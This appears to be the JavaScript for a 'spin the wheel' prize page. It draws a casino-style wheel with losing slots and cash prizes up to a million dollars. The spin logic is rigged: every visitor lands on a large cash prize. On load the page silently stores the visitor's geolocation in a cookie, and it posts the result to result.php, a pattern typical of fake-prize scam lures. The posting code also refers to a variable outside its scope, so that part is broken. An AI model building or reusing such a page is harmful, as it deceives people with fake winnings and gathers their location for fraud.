const wheel = document.getElementById("wheel");
const spinBtn = document.getElementById("spin-btn");
const finalValue = document.getElementById("final-value");
const congratsModal = document.getElementById("congrats-modal");
const closeModalBtn = document.getElementById("close-modal-btn");
const modalContent = congratsModal.querySelector(".modal-content p");

function setCookie(name, value, days) {
  const d = new Date();
  d.setTime(d.getTime() + (days*24*60*60*1000));
  const expires = "expires="+ d.toUTCString();
  document.cookie = name + "=" + value + ";" + expires + ";path=/";
}

function getCookie(name) {
  const cname = name + "=";
  const decodedCookie = decodeURIComponent(document.cookie);
  const ca = decodedCookie.split(';');
  for(let i = 0; i < ca.length; i++) {
    let c = ca[i];
    while (c.charAt(0) === ' ') {
      c = c.substring(1);
    }
    if (c.indexOf(cname) === 0) {
      return c.substring(cname.length, c.length);
    }
  }
  return "";
}

// Reset UI state on page load
window.addEventListener("load", () => {
  // Check if user has spun before
  const hasSpun = getCookie("hasSpun");
  if (hasSpun === "true") {
    spinBtn.disabled = true;
  } else {
    spinBtn.disabled = false;
  }
  spinCount = hasSpun === "true" ? 1 : 0;
  isSpinning = false;
  finalValue.innerHTML = "";
  congratsModal.style.display = "none";

  // Detect user location and store in cookie
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (position) => {
        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        setCookie("userLocation", lat + "," + lon, 7); // store for 7 days
      },
      (error) => {
        // On error or permission denied, store empty location
        setCookie("userLocation", "unknown", 7);
      }
    );
  } else {
    // Geolocation not supported
    setCookie("userLocation", "unsupported", 7);
  }
});

// Values for 8 sections on the wheel
const values = [
  "Oh No! Try Again",
  "One More Chance",
  "$150,000",
  "$250,000",
  "$400,000",
  "$500,000",
  "$1000,000",
  "$750,000"
];

// Number of sectors
const sectorCount = values.length;
// Size of each piece (equal size)
const data = new Array(sectorCount).fill(10);

// 8 colorful casino-style colors
const pieColors = [
  "#e74c3c", // red
  "#f39c12", // orange
  "#f1c40f", // yellow
  "#2ecc71", // green
  "#1abc9c", // turquoise
  "#9b59b6", // purple
  "#34495e", // dark blue
  "#d35400"  // dark orange
];

// Create chart
let myChart = new Chart(wheel, {
  plugins: [ChartDataLabels],
  type: "pie",
  data: {
    labels: values,
    datasets: [
      {
        backgroundColor: pieColors,
        data: data,
      },
    ],
  },
  options: {
    responsive: true,
    animation: { duration: 0 },
    rotation: 0,
    plugins: {
      tooltip: false,
      legend: {
        display: false,
      },
      datalabels: {
        color: "#ffffff",
        formatter: (_, context) => {
          const value = context.chart.data.labels[context.dataIndex];
          if (value.length > 15) {
            // Split long text into two lines
            const mid = Math.floor(value.length / 2);
            return value.slice(0, mid) + '\n' + value.slice(mid);
          }
          return value;
        },
        font: { size: 12, weight: 'bold' },
        align: 'center',
        anchor: 'center',
        clamp: true,
        padding: 4,
        offset: 0,
        rotation: function(context) {
          // Rotate labels to be aligned inside each sector
          const index = context.dataIndex;
          const count = context.chart.data.labels.length;
          const angle = (360 / count) * index + (360 / count) / 2;
          return angle - 90; // Adjust by -90 degrees to align text properly
        },
      },
    },
  },
});

// Calculate the sector index from the rotation angle
const getSectorIndex = (angle) => {
  // Normalize angle between 0 and 360
  const normalizedAngle = (angle + 360) % 360;
  // Each sector is 360 / sectorCount degrees
  const sectorSize = 360 / sectorCount;
  // Calculate index by dividing angle by sector size, reversed because rotation is clockwise
  const index = Math.floor((360 - normalizedAngle + sectorSize / 2) % 360 / sectorSize);
  return index;
};

// Easing function for smooth deceleration (ease out cubic)
const easeOutCubic = (t) => 1 - Math.pow(1 - t, 3);

let isSpinning = false;
let spinCount = 0; // Track number of spins

spinBtn.addEventListener("click", () => {
  if (isSpinning) {
    alert("You can only spin once.");
    return;
  }
  
  if (spinCount >= 1) {
    alert("You can only spin once.");
    return;
  }

  isSpinning = true;
  spinBtn.disabled = true;
  finalValue.innerHTML = `<p>Good Luck!</p>`;

  spinCount++; // Increment spin count
  setCookie("hasSpun", "true", 7); // Set cookie to remember spin

  const totalSpins = 6; // Number of full rotations before stopping
  const sectorSize = 360 / sectorCount;

  // Find indexes of special values
  const ohNoIndex = values.findIndex(v => v.toLowerCase() === "oh no! try again".toLowerCase());
  const oneMoreChanceIndex = values.findIndex(v => v.toLowerCase() === "one more chance".toLowerCase());

  // Filter numerical values indexes (exclude special strings)
  const numericalIndexes = values
    .map((v, i) => ({v, i}))
    .filter(item => ![values[ohNoIndex].toLowerCase(), values[oneMoreChanceIndex].toLowerCase()].includes(item.v.toLowerCase()))
    .map(item => item.i);

  // Determine winning index based on spin count and special rules
  let winningIndex;

  // Always pick random numerical value
  winningIndex = numericalIndexes[Math.floor(Math.random() * numericalIndexes.length)];

  // Calculate the final rotation angle to land on the winning sector
  // We rotate clockwise, so subtract angle
  const finalAngle = 360 * totalSpins + (360 - (winningIndex * sectorSize + sectorSize / 2));

  const duration = 10000; // Spin duration in ms
  const start = performance.now();

  const animate = (time) => {
    const elapsed = time - start;
    const progress = Math.min(elapsed / duration, 1);
    const easedProgress = easeOutCubic(progress);
    const currentAngle = easedProgress * finalAngle;

    myChart.options.rotation = currentAngle % 360;
    myChart.update();

    if (progress < 1) {
      requestAnimationFrame(animate);
    } else {
      // Spin ended, show result
      const sectorIndex = getSectorIndex(myChart.options.rotation);
      const winningValue = myChart.data.labels[sectorIndex];
      const formattedValue = winningValue.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
      modalContent.textContent = `Congratulations! You won : ${formattedValue}`;
      congratsModal.style.display = "block";
      finalValue.innerHTML = "";
      isSpinning = false;
      // Disable spin button permanently after 1 spin
      spinBtn.disabled = spinCount >= 1;
    }

    // Post spin result to result.php
    const xhr = new XMLHttpRequest();
    xhr.open("POST", "result.php", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("spinResult=" + encodeURIComponent(formattedValue));
  };

  requestAnimationFrame(animate);
});

  
// Close modal on button click
closeModalBtn.addEventListener("click", () => {
  congratsModal.style.display = "none";
});
